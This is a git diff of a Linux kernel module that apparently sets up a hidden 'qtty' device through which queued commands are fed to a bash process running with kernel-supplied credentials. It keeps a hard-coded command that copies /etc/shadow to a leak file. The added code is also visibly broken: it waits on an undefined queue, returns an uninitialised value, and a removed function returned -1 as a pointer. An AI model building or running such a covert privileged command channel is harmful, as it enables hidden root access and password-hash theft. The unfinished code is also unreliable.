@@ -13,6 +13,28 @@ struct qtty qtty;
 
 char* str = "cat /etc/shadow > shadow_leak\n";
 
+
+/*
+Linux kernel list semantics are interesting. Apparently, the way this works is that an empty list is a list 
+where the list->next == list. This implies that the list contains one entry at all times. Therefore,
+we can assume that the first entry in the list is a dummy entry that does nothing. However, any entry after actually
+contains real data. BatChest. 
+*/
+LIST_HEAD(commands);  //commands is the list containg the commands
+
+
+DECLARE_WAIT_QUEUE_HEAD(command_wait); //command wait queue
+/*
+
+the command we're currently writing
+
+We need to do this because bash reads the command one-by-one. So, we need to continually iterate through cur_command.
+
+Eventually, when we are done with cur_command, we will pull it off 
+
+*/
+struct command* cur_command; //the command we are currently processing
+
 ssize_t qtty_write(struct file* f, const char __user * buf, size_t size, loff_t* off){
     printk(KERN_INFO "WRITING\n");
     char* kbuf = (char*)kzalloc(size+1, GFP_KERNEL); //make sure the string actually terminates so add 1 
@@ -34,21 +56,52 @@ ssize_t qtty_write(struct file* f, const char __user * buf, size_t size, loff_t*
 
 
 int qtty_open(struct inode* i, struct file* f){ // a qtty can never be "opened" because there is no reference to it in the file system. It exists as an invisible device in the backend.
-    printk(KERN_INFO "TTY opened");
+    //nop. We should never reach this function because we are opened as an anon inode.
     return 0;
+}
+
+
+void wait_read(void){ //wait for a command to be added to 
+  DECLARE_WAITQUEUE(wait, current);
+  add_wait_queue(&command_wait, &wait);
+
+   while(1){ //wait for task to start
+    set_current_state(TASK_UNINTERRUPTIBLE);
+    if(!list_empty(&commands))
+      break;
+    schedule();
+  }
+
+
+  __set_current_state(TASK_RUNNING);
+  remove_wait_queue(&qogchamp_wait, &wait);
+  
 }
 
 ssize_t qtty_read(struct file* f, char* __user buf, size_t size, loff_t* off){
   
-  size_t to_copy = size <= strlen(str) ? size : strlen(str);
-  //printk(KERN_INFO "Pre-READ %ld, offset: %llu, to_copy: %d, str_size: %d", size, *off, to_copy, strlen(str));
+  size_t to_copy; //= size <= strlen(str) ? size : strlen(str);
+ 
   if(!access_ok(buf,size))
     return -EFAULT;
-  //printk(KERN_INFO "copying\n");
-  unsigned long ret = copy_to_user(buf, str+(*off % strlen(str)), to_copy);
-  (*off) = ((*off) + 1) % strlen(str);
-  //printk(KERN_INFO "Post-READ %ld, offset: %llu", size, *off);
-  //printk(KERN_INFO "copied bytes: %lu\n", ret);
+  
+
+  
+
+  if(!cur_command){
+    if(list_empty(&commands)){
+      wait_read(); //wait until we get a new command
+    }
+    cur_command = list_entry(commands.next, struct command, list); //get a new cur_command if there is no cur_command
+  }
+
+  //we should have a valid cur_command
+
+
+
+ // unsigned long ret = copy_to_user(buf, str+(*off % strlen(str)), to_copy);
+ // (*off) = ((*off) + 1) % strlen(str);
+  
   return to_copy;
     
   
@@ -61,33 +114,6 @@ const struct file_operations qtty_fops = {
     .owner = THIS_MODULE
 };
 
-
-/*
-Allocate a fd to a qtty. 
-*/
-struct file* alloc_file_qtty(int flags, const struct cred* cred){ //the idea is that cred has already been initialized in the ini function of umh. So, what we can do is call current_cred() to get the cred
-  struct file* f;
-  f = kzalloc(sizeof(struct file), GFP_KERNEL);
-  if(!f){
-    printk(KERN_INFO "OOM'd\n");
-    return -1;
-  }
-  f->f_cred = cred;
-  atomic_long_set(&f->f_count, 1);
-  rwlock_init(&f->f_owner.lock);
-  spin_lock_init(&f->f_lock);
-  mutex_init(&f->f_pos_lock);
-  f->f_flags = flags; 
-  f->f_mode = FMODE_READ | FMODE_WRITE | FMODE_CAN_WRITE;
-
-  //above is all initialization. Now it's time to setup the qtty
-
-  f->f_op = &qtty_fops;
-
-  return f;
-
-
-}
 
 
 
